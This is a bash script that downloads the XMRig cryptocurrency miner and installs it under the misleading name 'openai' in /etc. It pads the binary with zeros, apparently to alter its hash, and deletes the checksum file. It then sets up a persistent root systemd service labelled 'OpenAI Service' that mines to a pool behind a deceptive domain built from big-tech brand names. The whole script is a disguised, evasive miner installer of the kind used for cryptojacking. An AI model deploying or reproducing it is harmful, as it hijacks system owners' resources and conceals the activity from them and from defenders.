#!/bin/bash

U=$1
latest=`wget -qO- -t1 -T2 "https://api.github.com/repos/xmrig/xmrig/releases/latest" | grep "tag_name" | head -n 1 | awk -F ":" '{print $2}' | sed 's/\"//g;s/,//g;s/ //g' | awk -F "v" '{print $2}'`
wget -O 1.tar.gz https://github.com/xmrig/xmrig/releases/download/v$latest/xmrig-$latest-linux-static-x64.tar.gz 
tar -zxvf 1.tar.gz
mv xmrig-$latest openai
mv openai/xmrig openai/openai
mv openai /etc/openai
rm -rf 1.tar.gz
cd openai && rm -rf SHA256SUMS
random_number=$((RANDOM % 188 + 68))
for i in $(seq 1 $random_number); do
  echo -n "0" >> /etc/openai/openai
done
cat > /etc/systemd/system/openai.service <<EOL
[Unit]
Description=OpenAI Service
After=network.target

[Service]
Type=simple
ExecStart=/etc/openai/openai -a rx -o stratum+ssl://rx.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $1 -p x
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
EOL

systemctl daemon-reload
systemctl enable openai.service
systemctl start openai.service
sleep 2
systemctl status openai.service
#./openai -a rx -o stratum+ssl://rx.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $U -p x
